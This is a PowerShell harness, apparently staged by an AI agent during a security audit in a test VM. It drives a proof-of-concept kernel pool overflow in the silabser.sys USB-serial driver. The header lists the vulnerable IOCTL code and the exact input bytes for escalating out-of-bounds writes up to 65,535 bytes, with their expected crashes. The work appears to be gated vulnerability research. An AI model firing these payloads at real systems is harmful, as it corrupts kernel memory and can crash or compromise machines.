# ============================================================================
# t4_phaseB.ps1 - DESTRUCTIVE PHASE B (staged by agent t4 during Phase A).
# NOT EXECUTED BY AGENT t4. Orchestrator-gated solo phase ONLY.
#
# Under test: silabser.sys IOCTL 0x222028 CP210x_GET_USB_CONTROL_IOCTL
# (static audit silabser.md section 5.1): driver wraps (output+8) as a
# wLength-byte USB control-IN buffer with NO check against the 9-byte output
# buffer => kernel non-paged pool OOB write of up to 65,535 bytes.
#
# Usage - ONE vmrun runProgramInGuest invocation PER STEP, then pull the
# per-step evidence file to the host IMMEDIATELY (evidence must survive a
# mid-sequence guest death / BSOD):
#   vmrun -T ws -gu vmdebug -gp 123456 runProgramInGuest <vmx> \
#     "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
#     -NoProfile -ExecutionPolicy Bypass -File \
#     C:\Users\vmdebug\Desktop\t4_work\t4_phaseB.ps1 -Step B0
#   ... then CopyFileFromGuestToHost t4_phaseB_B0.txt ... repeat for B1, B2, B3.
#
# Steps (device path is auto-resolved from DeviceClasses\{a2a39220-...}):
#   B0 (safe):  responding-device gate = 0x222008 (18-B descriptor) + 0x222098
#               (removed flag 0) + 0x222028 wLength=1 live GET_STATUS. If it
#               fails, the script aborts with:
#               "no responding device - hardware pass-through or USB emulation required"
#   B1 (17 B OOB):  0x222028 in= 80 06 00 01 00 00 12 00 (GET_DESCRIPTOR wLength=18),
#               out=9 B -> 17-byte overflow past the non-paged pool system buffer.
#               Expected: transient pool damage; may survive; pool now suspect.
#   B2 (4 KB OOB):  0x222028 in= 80 06 00 01 00 00 00 10 (wLength=0x1000), out=9 B
#               -> up to 4 KB of adjacent pool overwritten; bugcheck likely,
#               silabser.sys expected in the bugcheck stack.
#   B3 (max):       0x222028 in= 80 06 00 01 00 00 FF FF (wLength=0xFFFF), out=9 B
#               -> max 65,535-byte overflow. Run ONLY if B2 was somehow survivable.
# The C# helper pre-flushes every log line BEFORE the destructive call, so the
# pre-call evidence is on disk even if the guest dies inside the call.
# After any step: do NOT reboot/power-cycle from agent scripts - orchestrator-only.
# ============================================================================
param([Parameter(Mandatory=$true)][ValidateSet('B0','B1','B2','B3')][string]$Step,
      [string]$BridgeGuid = '{a2a39220-39f4-4b88-aecb-3d86a35dc748}')

$ErrorActionPreference = 'Continue'
$work = 'C:\Users\vmdebug\Desktop\t4_work'
$ev   = Join-Path $work ("t4_phaseB_{0}.txt" -f $Step)
$exe  = Join-Path $work 't4_phaseB.exe'

$sb = New-Object System.Text.StringBuilder
function W($s){ $sb.AppendLine($s) | Out-Null }

W ("=== t4 PHASE B step {0}  {1} ===" -f $Step, (Get-Date -Format o))
W ("DESTRUCTIVE phase - staged by agent t4; execution is orchestrator-gated")

$root = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceClasses\$BridgeGuid"
$link = $null
if (Test-Path $root) {
  $child = Get-ChildItem $root -ErrorAction SilentlyContinue | Select-Object -First 1
  if ($child) { $link = '\\?\' + $child.PSChildName.Substring(4) }
}
if (-not $link) {
  # Fallback: comport interface
  $root2 = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceClasses\{86e0d1e0-8089-11d0-9ce4-08003e301f73}'
  if (Test-Path $root2) {
    $child = Get-ChildItem $root2 -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -like '*T4SILABSER*' } | Select-Object -First 1
    if ($child) { $link = '\\?\' + $child.PSChildName.Substring(4) }
  }
}
if (-not $link) { W ("FATAL: no device interface found (roots empty) - recreate the devnode first"); [IO.File]::WriteAllText($ev, $sb.ToString()); exit 4 }
W ("device interface: " + $link)

$pocLog = Join-Path $work ("t4_phaseB_{0}_poc.txt" -f $Step)
if (Test-Path $pocLog) { Remove-Item $pocLog -Force }
& $exe $pocLog $Step $link 2>&1 | Out-Null
$rc = $LASTEXITCODE
W ("t4_phaseB.exe exit code: " + $rc)
if (Test-Path $pocLog) { Get-Content $pocLog | ForEach-Object { W ('  ' + $_) } }
if ($Step -ne 'B0' -and $rc -ne 0) { W ('NOTE: step aborted (gate/open failure) - NO OOB transfer sent for this step') }
if ($rc -eq 0 -and $Step -ne 'B0') { W ('NOTE: step call RETURNED - guest survived this step (evidence above)') }

Set-Content -Path "$work\t4_alive.txt" -Value ("alive {0} phaseB-{1}" -f (Get-Date -Format o), $Step)
[IO.File]::WriteAllText($ev, $sb.ToString())
